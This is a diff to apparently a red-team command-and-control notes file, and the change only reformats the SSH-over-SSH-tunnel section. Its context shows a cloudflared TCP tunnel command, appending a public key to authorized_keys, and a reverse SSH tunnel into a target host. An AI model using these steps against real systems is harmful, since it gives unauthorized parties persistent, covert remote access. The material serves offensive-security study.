@@ -29,19 +29,20 @@ cloudflared.exe access tcp --hostname rainbow-alignment-risk-harold.trycloudflar
 
 # SSH
 ## SSH over an SSH tunnel
-![This is an image](/Tactics/CommandAndControl/assets/ssh_over_ssh_tunnel.png)
+<p align="center">
+  <img align="center" src="/Tactics/CommandAndControl/assets/ssh_over_ssh_tunnel.png" width="50%">
+</p>
 
-
-  - Add a public key to authorized keys:
+  1. Add a public key to authorized keys:
 ```sh
 echo "<public_key>" >> ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 ```
-  - Connect **vega** to **proxima**
+  2. Connect **vega** to **proxima**
 ```sh
 ssh -i <id_rsa_vega> <username_on_proxima>@proxima -R 2222:127.0.0.1:22 # Listen on port TCP 2222 on proxima/localhost
 ```
-  - Connect to the target host
+  3. Connect to the target host
 ```sh
 ssh -i <id_rsa_proxima> <username_on_vega>@localhost -p 2222
 ```
